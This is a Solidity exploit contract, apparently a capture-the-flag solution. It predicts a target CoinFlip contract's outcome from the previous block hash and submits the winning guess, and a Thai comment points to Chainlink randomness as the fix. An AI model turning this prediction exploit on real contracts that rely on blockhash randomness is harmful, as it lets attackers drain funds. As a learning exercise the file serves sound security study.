// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

interface CoinFlip {
    function flip(bool _guess) external returns (bool);
}

// ใช้ chain.link เพื่อ random number จริงๆ
// https://docs.chain.link/docs/get-a-random-number/

contract HackCoinFlip {
    CoinFlip _coinflip;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;
    bool public side;
    uint256 public blockNumber;
    uint256 public blockhashNumber;

    constructor(address _addressCoinFlip) public {
        _coinflip = CoinFlip(_addressCoinFlip);
    }

    function hack() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        blockNumber = block.number;
        blockhashNumber = uint256(blockhash(block.number - 1));
        uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);
        side = coinFlip == 1 ? true : false;
        _coinflip.flip(side);
    }
}
